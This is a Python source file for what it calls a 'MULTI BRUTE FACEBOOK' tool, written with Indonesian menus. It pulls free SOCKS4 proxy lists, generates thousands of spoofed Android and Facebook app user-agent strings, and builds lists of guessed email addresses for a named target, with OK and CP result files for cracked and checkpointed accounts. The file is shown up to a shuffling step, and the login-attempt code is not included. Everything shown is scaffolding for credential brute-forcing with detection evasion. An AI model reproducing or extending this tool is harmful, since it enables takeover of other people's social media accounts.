# requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import time as kontol
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from datetime import datetime
from rich.text import Text as tekz
pretty.install()
CON=sol()
cokbrut=[]
wa=sol()
ses=requests.Session()
princp=[]
ugen=[]
ugen2=[]
ugen3=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	rr = random.randint
	andro_version = str(random.randint(4,13))
	fbav = str(random.randint(50,367))+'.'+str(random.randint(0,2))+'.0.'+str(random.randint(1,20))+'.'+str(random.randint(50,300))
	fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
	density = str(random.choice(['1.2','1.0','2.0','2.25','3.0','3.25']))
	height = str(random.randint(333,4444))
	width = str(random.randint(344,4444))
	andro_mini = str(random.randint(3,9))+'.'+str(random.randint(0,2))+'.'+str(random.randint(0,2))
	usertrel = str(random.randint(1111,3333))
	fblc = random.choice(['en_GB','en_US','es_MX','th_TH','pl_PL'])
	fbpn = random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite'])
	fban = random.choice(['Katana-Android','Adsmanager-Android','Facebook.lite-Android','Orca-Android','Facebook.mlite-Android','MessengerLite'])
	asu = ('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')
	build = (str(random.choice(asu))+str(random.choice(asu))+str(random.randint(1,9))+str(random.choice(asu))+'.'+str(random.randint(111111,333333))+'.'+'00'+str(random.randint(1,9)))
	redmi = str(random.randint(1,30))
	a = random.randrange(30,200)
	b = random.randrange(1000,5000)
	c = random.randrange(10,150)
	andro = random.choice(['2','3','4','4.0.4','4.1.1','4.1.2','4.2.2','5','5.0','5.0.2','5.1.1','6','6.0','6.0.1','7','7.0','8','8.0.0','8.1','9','10','11','12','13'])
	chr = f'{a}.0.{b}.{c}'
	chrome = random.choice(['87.0.4280.101','106.0.5249.126','55.0.2883.91','79.0.3945.116','92.0.4515.159','96.0.4664.45','92.0.4515.131','91.0.4472.101','91.0.4472.120','90.0.4430.91','51.0.2704.91','78.0.3904.108','107.0.5304.54','112.0.5615.48','73.0.3683.90','85.0.4183.127','85.0.4183.101','83.0.4103.106','85.0.4183.101','83.0.4103.106','74.0.3729.157','80.0.3987.162','80.0.3987.149','78.0.3904.108','112.0.0.0','113.0.5672.162','108.0.0.0','88.0.4324.141','92.0.4515.159','104.0.5112.97','61.0.3163.98','114.0.0.0','72.0.3626.76','37.0.0.0','47.0.2526.100','42.0.2311.111','69.0.3497.100'])
	fbap = random.choice(['414.0.0.30.113','414.0.0.30.113','354.0.0.8.108','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','414.0.0.30.113','413.0.0.30.104','414.0.0.30.113','408.1.0.16.113','363.0.0.30.112'])
	fbbv = str(random.randint(111111111,999999999))
	s = random.choice(['SamsungBrowser/96.4','SamsungBrowser/19.0','SamsungBrowser/9.2','SamsungBrowser/3.0','SamsungBrowser/3.1','SamsungBrowser/3.2','SamsungBrowser/3.3','SamsungBrowser/3.4','SamsungBrowser/3.5','SamsungBrowser/3.6','SamsungBrowser/3.7','SamsungBrowser/3.8','SamsungBrowser/3.9','SamsungBrowser/4.0','SamsungBrowser/2.0','SamsungBrowser/2.1','SamsungBrowser/2.2','SamsungBrowser/2.3','SamsungBrowser/2.4','SamsungBrowser/2.5','SamsungBrowser/2.6','SamsungBrowser/2.7','SamsungBrowser/2.8','SamsungBrowser/2.9','SamsungBrowser/1.0','SamsungBrowser/1.1','SamsungBrowser/1.2','SamsungBrowser/5.0','SamsungBrowser/5.1','SamsungBrowser/5.2','SamsungBrowser/5.3','SamsungBrowser/5.4','SamsungBrowser/5.5','SamsungBrowser/5.6','SamsungBrowser/5.7','SamsungBrowser/5.8','SamsungBrowser/5.9','SamsungBrowser/6.0','SamsungBrowser/6.1','SamsungBrowser/19.0','SamsungBrowser/20.0','SamsungBrowser/21.0','SamsungBrowser/18.0','SamsungBrowser/17.0','SamsungBrowser/16.0','SamsungBrowser/15.0'])
	t = random.choice(['Build/JZO54K)','Build/LMY47V)','Build/LMY48B)','Build/LRX22C)','Build/LRX21V) ','Build/LRX22G)','Build/LRX21T)','Build/GINGERBREAD)','Build/JDQ39)','Build/KOT49H)','Build/KTU84P)','Build/LMY47X)','Build/LRX22G)'])
	mini = random.choice(['2','3','4','4.0.4','4.1.1','4.1.2','4.2.2','5','5.0','5.0.2','5.1.1','6','6.0','6.0.1','7','7.0','8','8.0.0','8.1','4.3','5.0','7.0','7.0.1','8.1.0','6.0.1;','10','11','12','13'])
	merk = random.choice(['SM-G850F','SM-G850FQ','SM-G850Y','SM-G850M','SM-G850T','SM-G850A','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','SM-J415GN','SM-J415N','SAMSUNG SM-T530','SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','SM-G850S','SM-G850L','SM-G850K','SM-E025F','SM-J415F','SM-J415FN','SM-J415G','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021)','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','SAMSUNG SM-G996B)','GT-S7500L','GT-S7500T'])
	a1 = str(random.randint(40,599))
	a2 = str(random.randint(10,99))
	a3 = str(random.randint(10,99))
	ins = f'{a1}.0.0.{a2}.{a3}'
	b4 = str(random.randint(10,99))
	b5 = str(random.randint(10,99))
	yan = f'{b4}.{b5}.0'
	c6 = str(random.randint(1,9))
	c7 = str(random.randint(1,9))
	c8 = str(random.randint(1,9))
	c9 = str(random.randint(100,999))
	qua = f'{c6}.{c7}.{c8}.{c9}'
	d10 = str(random.randint(10,99))
	d11 = str(random.randint(10000,99999))
	ed = f'{d10}.{d11}'
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Mozilla/5.0 (LG-T510 AppleWebkit/531 Browser/Phantom/V2.0 Widget/LGMW/{str(rr(1,15))}.0 MMS/LG-MMS-V1.0/{str(rr(1,15))}.2 Java/ASVM/{str(rr(1,15))}.1 Profile/MIDP-{str(rr(1,15))}.1 Configuration/CLDC-{str(rr(1,15))}.1)"
	
	ua2 = f"Mozilla/5.0 (Linux; U; Android 11; ms-my; CPH2269 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,114))}.0.{str(rr(3300,3600))}.80 Mobile Safari/537.36 HeyTapBrowser/{str(rr(30,114))}.7.5.9"
	
	ua3 = f"Mozilla/5.0 (Android; Android 5.0; HTC Butterfly S 919d Build/LRX22G) AppleWebKit/536.41 (KHTML, like Gecko) Chrome/55.0.3849.286 Mobile Safari/602.7"
	
	ua4 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,114))}.0.0.0 Mobile Safari/537.36"
	
	ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	
	ua6 = f"Mozilla/5.0 (Linux; U; Android 14; PGCM10 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 105.0.5284.36 Mobile Safari/537.36"
	
	ua7 = f"Mozilla/5.0 (Linux; U; Android 5.0; Lenovo A7000-a Build/LRX21M;) AppleWebKit/603.44 (KHTML, like Gecko) Chrome/54.0.1980.159 Mobile Safari/534.4"
	
	ua8 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	
	ua9 = f"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
	
	ua10 = f"Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
	
	ua11 = f"Mozilla/5.0 (Android; Android 4.4.1; [HM NOTE|NOTE-III|NOTE2 1LTEW) AppleWebKit/602.14 (KHTML, like Gecko) Chrome/51.0.1120.379 Mobile Safari/534.8"
	
	ua12 = f"Mozilla/5.0 (Linux; U; Android 5.1; SAMSUNG SM-G925FD Build/LMY47X) AppleWebKit/537.42 (KHTML, like Gecko) Chrome/49.0.1539.347 Mobile Safari/535.8"
	
	ua13 = f"Mozilla/5.0 (Linux; Android 4.4.4; SAMSUNG SM-G900FD Build/KOT49H) AppleWebKit/534.5 (KHTML, like Gecko) Chrome/51.0.3918.268 Mobile Safari/537.9"
	
	ua14 =f"Mozilla/5.0 (Linux; Android 4.4.4; IQ4500 Quad Build/KOT49H) AppleWebKit/603.31 (KHTML, like Gecko) Chrome/50.0.3304.234 Mobile Safari/533.4"
	
	ua15 =f"Mozilla/5.0 (Linux; Android 6.0; SM-G9258 Build/MDB08I) AppleWebKit/602.16 (KHTML, like Gecko) Chrome/48.0.1986.382 Mobile Safari/536.0"
	
	uaku2 = random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12,ua13,ua14,ua15])
	ugen.append(uaku2)

	
for xd in range(10000):
    rr = random.randint; rc = random.choice
    andro = str(rc(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13']))
    lonte = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'] 
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    strvoppo = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(oppo))} Build/{str(rc(lonte))}){str(rr(1,20))}  AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    uateddy = random.choice([strvoppo])
    ugen.append(uateddy)
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
x = '\33[m' # DEFAULT
S = '\x1b[0;00m'
I = '\x1b[0;32m'
C = '\x1b[0;36m'
Q = '\x1b[00m'
ff = '\x1b[0;36m'
G = '\x1b[0;36m'
i = '\x1b[0;32m'
mm = '\x1b[0;36m'
R = '\x1b[0;36m'
W = '\x1b[0;00m'
c = '\x1b[0;32m'
o = '\x1b[0;31m'
T = '\x1b[1;94m'
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
asu = random.choice([m,k,h,u,b])
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"OK-{days}-{reall}-{year}.txt"
cpc = f"CP-{days}-{reall}-{year}.txt"
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Sore"
	else:timenow = "Selamat Malam"
	return timenow

def jalan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
#--------------------[ BAGIAN-MASUK ]--------------#

def back():
	menu()
def logo():
	clear()
	wa.print(f'''\r
[white]╔═╗╔═╦═══╦════╦═══╗╔═══╦═══╦═══╗╔╗─╔╦═══╦═══╗
[white]║║╚╝║║╔══╣╔╗╔╗║╔═╗║║╔══╣╔═╗║╔═╗║║║─║║╔═╗║╔═╗║
[white]║╔╗╔╗║╚══╬╝║║╚╣║─║║║╚══╣║─║║╚═╝║║║─║║╚══╣║─║║
[white]║║║║║║╔══╝─║║─║╚═╝║║╔══╣║─║║╔╗╔╝║║─║╠══╗║╚═╝║
[white]║║║║║║╚══╗─║║─║╔═╗║║║──║╚═╝║║║╚╗║╚═╝║╚═╝║╔═╗║
[white]╚╝╚╝╚╩═══╝─╚╝─╚╝─╚╝╚╝──╚═══╩╝╚═╝╚═══╩═══╩╝─╚╝
[blue] EST. 2024
[blue] MULTI BRUTE FACEBOOK   
[blue] VERSI: NEW
[green] STATUS: PREMIUM 
[green] RECODE BY: Demozz ID    
[green] CODE BY: Mozz-Xcode               ''')
      
def menu():
	clear()
	logo()
	wa.print(f'\r[r green]MENU LIST')
	print(f'{P}[{h}1{P}] Crack Email   {P}[{H}ON{P}]')
	print(f'{P}[{h}2{P}] Check Ressult {P}[{H}ON{P}]')
	___Sllowly_ID____ = input(f' └──Pilih : ')
	if ___Sllowly_ID____ in ['1']:
		Email()
	elif ___Sllowly_ID____ in ['']:Error()
	else:
		print(f' {P}└─{J} pilih yang benar ');time.sleep(3);back()



def Email():
	wa.print(f'\r[r green]MAIL CRACK')
	dump=[]
	rc = random.choice
	rr = random.randint
	xc = ['jaki','juned','fikri','dika','nanang','agus','bode','acill','ilham','eka','toni','toto','bagus','bagas','joko','erik','samsul','udin','ucup','endang','dudung','putra','bondol','cecep','jamal','rifki','cicih','cucu','iis','dahlia','imas','nanda','nazwa','zahra','zahwa','fitri','neni','encin','titin','yoyoh','iin','ineke','andin','tari','ninis','nesya','firda','septi','lasma','mutia','mpit','sifa','siti','syifa','zahra','elin','mela']
	blk = ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','maulana','ramdani','ramadan','mulyana','irawan','susanto','saputra','sinaga','mulyono','wibowo','wirawan','hermawan','darmawan','hermanto','sulaeman','kurniawan','setiawan','sukaesih','aprilia','apriliani','rahayu','lestari','safitri','nurhasanah','fatimah','aisyah','nurjanah','khoerunisa','fadilah','ningsih','yuningsih','ningsih','nengsih','suningsih','yulianti','julianti','pertiwi','pratiwi','mulyani','wahyuni','hutagalung','suherni','damayanti','kartika','kartini','dimas','riski','agus','fadil','tiawan','aprianto','bimasakti','gilang','ardian','purtianto','saleh','caca','rani','puspita','santi','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','77','01','02','03','04','06','07','08','08','09','11','11']
	global ok , cc
	nama = input(f'{P}[{H}?{P}] nama target : ')
	if ',' in str(nama):
		print(f' {P}└─{J} masukan nama, jangan kosong ')
		time.sleep(3);exit()
	doma = input(f'{P}[{H}?{P}] domain (ex:@gmail.com) : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f' {P}└─{J} masukkan domain dengan benar ')
		time.sleep(3);exit()
	jumlah = input(f'{P}[{H}?{P}] total dump (max:10000) : ')
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:auto()
		sys.stdout.write(f"\r{P}[{H}±{P}] berhasil mengumpulkan {asu}{len(id)} {P}email...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	

def Error():
	print(f' {P}└─{J} error in selecting features')
	time.sleep(4)
	back()
	

def setting():
	if len(id)==0:
		exit(f' {P}└─{J} uid tidak publik')
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
